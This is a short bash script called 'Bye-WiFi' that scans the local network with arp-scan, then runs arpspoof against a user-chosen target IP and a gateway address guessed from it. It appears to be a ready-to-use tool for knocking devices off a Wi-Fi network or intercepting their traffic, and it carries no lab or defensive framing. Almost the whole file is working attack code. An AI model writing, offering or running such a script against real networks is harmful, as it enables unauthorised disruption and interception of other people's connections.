#!/bin/bash

cat << "EOF"
  ____                 __          ___ ______ _
 |  _ \                \ \        / (_)  ____(_)
 | |_) |_   _  ___ _____\ \  /\  / / _| |__   _
 |  _ <| | | |/ _ \______\ \/  \/ / | |  __| | |
 | |_) | |_| |  __/       \  /\  /  | | |    | |
 |____/ \__, |\___|        \/  \/   |_|_|    |_|
         __/ |     Created By DevCavac
        |___/
EOF

check_tool() {
     if ! [ -x "$(command -v $1)" ]; then 
        echo "Error: $1 is not installed. Please install $1 and try again." >&2
        exit 1
     fi
}

check_tool "dsniff"

read -p "Enter the network interface you want to analyze: " interface
arp-scan -I "$interface" --localnet # Add this command

read -p "Enter the IP to target: " ip
gateway=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interface" -t "$ip" "$gateway"
